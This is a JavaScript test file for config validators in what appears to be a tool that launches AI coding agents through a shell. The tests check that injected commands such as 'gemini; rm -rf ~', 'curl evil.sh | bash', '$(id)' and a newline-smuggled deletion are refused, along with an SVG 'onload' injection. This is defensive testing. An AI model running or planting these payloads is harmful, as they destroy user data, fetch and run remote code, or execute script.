import test from 'node:test'
import assert from 'node:assert/strict'
import { validateConfig, validateRuntime, validatePersona } from '../src/validate.js'

// These validators are the gate every machine-written config passes through —
// the bootstrap's proposal and Pro's custom personas both land here. If this
// file is green, "the model generated it" and "it was checked" are the same
// statement. That is the whole point of routing generated config through one
// door.

/* ── runtimes: the security-critical one ─────────────────────────────────── */

test('a plain runtime is accepted', () => {
  const r = validateRuntime({ id: 'gemini', label: 'gemini', command: 'gemini' })
  assert.equal(r.ok, true)
  assert.equal(r.value.command, 'gemini')
})

test('an absolute path command is accepted', () => {
  assert.equal(validateRuntime({ id: 'internal', command: '/usr/local/bin/agent' }).ok, true)
})

// The command string is executed via `zsh -lic <cmd>`. Anything that could turn
// one program name into a second command must be refused, or config.json is a
// remote-code-execution vector wearing a settings file's clothes.
test('shell metacharacters are refused in a runtime command', () => {
  const attacks = [
    'gemini; rm -rf ~',
    'gemini && curl evil.sh | bash',
    'gemini || true',
    'gemini `whoami`',
    'gemini $(id)',
    'gemini > /etc/passwd',
    'gemini | tee x',
    'gemini &',
    'gemini\nrm -rf ~',
    'gemini --flag',        // arguments are not allowed either
    'echo "hi"',
    "sh -c 'x'",
    'gemini*',
    'gemini~',
  ]
  for (const command of attacks) {
    const r = validateRuntime({ id: 'x', command })
    assert.equal(r.ok, false, `should have refused: ${command}`)
    assert.equal(r.value, null)
  }
})

test('a runtime cannot shadow the built-in shell profile', () => {
  assert.equal(validateRuntime({ id: 'shell', command: 'bash' }).ok, false)
  assert.equal(validateRuntime({ id: 'zsh', command: 'bash' }).ok, false)
})

test('a runtime needs a usable id and a command', () => {
  assert.equal(validateRuntime({ command: 'x' }).ok, false)
  assert.equal(validateRuntime({ id: 'ok' }).ok, false)
  assert.equal(validateRuntime({ id: 'HAS SPACES', command: 'x' }).ok, false)
  assert.equal(validateRuntime(null).ok, false)
})

test('a runtime without a label falls back to its id', () => {
  assert.equal(validateRuntime({ id: 'aider', command: 'aider' }).value.label, 'aider')
})

/* ── config ──────────────────────────────────────────────────────────────── */

test('a full valid config passes and is normalized', () => {
  const { ok, value } = validateConfig({
    roots: ['~/code'],
    projects: [{ id: 'api', label: 'Billing API', path: '~/code/api' }],
    hidden: ['scratch'],
    runtimes: [{ id: 'gemini', command: 'gemini' }],
    models: ['claude-opus-4-1'],
  })
  assert.equal(ok, true)
  assert.equal(value.projects[0].label, 'Billing API')
  assert.deepEqual(value.hidden, ['scratch'])
  assert.equal(value.runtimes[0].id, 'gemini')
  assert.deepEqual(value.models, ['claude-opus-4-1'])
})

test('a config that is not an object is refused with a reason', () => {
  for (const bad of [null, undefined, 'string', 42, []]) {
    const r = validateConfig(bad)
    assert.equal(r.ok, false)
    assert.ok(r.errors.length, 'a rejection must explain itself')
  }
})

test('malformed sections are reported individually, not as one opaque failure', () => {
  const r = validateConfig({ roots: 'not-an-array', projects: 'nope', hidden: 5 })
  assert.equal(r.ok, false)
  assert.equal(r.errors.length, 3)
  assert.ok(r.errors.some(e => e.includes('roots')))
  assert.ok(r.errors.some(e => e.includes('projects')))
  assert.ok(r.errors.some(e => e.includes('hidden')))
})

test('a project without a path is rejected by index so the author can find it', () => {
  const r = validateConfig({ projects: [{ id: 'ok', path: '/a' }, { id: 'bad' }] })
  assert.equal(r.ok, false)
  assert.ok(r.errors.some(e => e.includes('projects[1]')))
})

// A hostile runtime buried in an otherwise-fine generated config must sink the
// config, not slip through beside the valid entries.
test('one bad runtime invalidates the whole generated config', () => {
  const r = validateConfig({
    projects: [{ id: 'a', path: '/a' }],
    runtimes: [{ id: 'good', command: 'gemini' }, { id: 'evil', command: 'x; rm -rf ~' }],
  })
  assert.equal(r.ok, false)
  assert.ok(r.errors.some(e => e.includes('runtimes[1]')))
})

test('an empty config is valid — everything is optional', () => {
  assert.equal(validateConfig({}).ok, true)
})

/* ── personas ────────────────────────────────────────────────────────────── */

test('a usable persona is accepted and defaulted', () => {
  const { ok, value } = validatePersona({
    id: 'compliance', name: 'Reg', role: 'Compliance',
    palette: { body: '#123456' },
    prompt: 'x'.repeat(120),
  })
  assert.equal(ok, true)
  assert.equal(value.edition, 'custom')
  assert.equal(value.palette.body, '#123456')
  assert.ok(value.palette.trim, 'missing palette slots get defaults')
  assert.equal(value.visor, 'dot')
})

// Palette values are interpolated straight into SVG attributes.
test('a non-hex palette value is refused rather than reaching the SVG', () => {
  const r = validatePersona({
    id: 'x', prompt: 'y'.repeat(120),
    palette: { body: '" onload="alert(1)' },
  })
  assert.equal(r.ok, false)
  assert.ok(r.errors.some(e => e.includes('palette.body')))
})

test('a persona too short to argue is refused', () => {
  const r = validatePersona({ id: 'x', prompt: 'be critical', palette: { body: '#fff' } })
  assert.equal(r.ok, false)
  assert.ok(r.errors.some(e => e.includes('80 characters')))
})

test('a persona id is normalized to a safe slug', () => {
  const { value } = validatePersona({ id: 'My Agent!!', prompt: 'z'.repeat(120), palette: { body: '#fff' } })
  assert.equal(value.id, 'myagent')
})

test('validators never throw on hostile input', () => {
  for (const bad of [null, undefined, 0, '', [], { palette: null }, { palette: { body: {} } }]) {
    assert.doesNotThrow(() => validatePersona(bad))
    assert.doesNotThrow(() => validateRuntime(bad))
    assert.doesNotThrow(() => validateConfig(bad))
  }
})
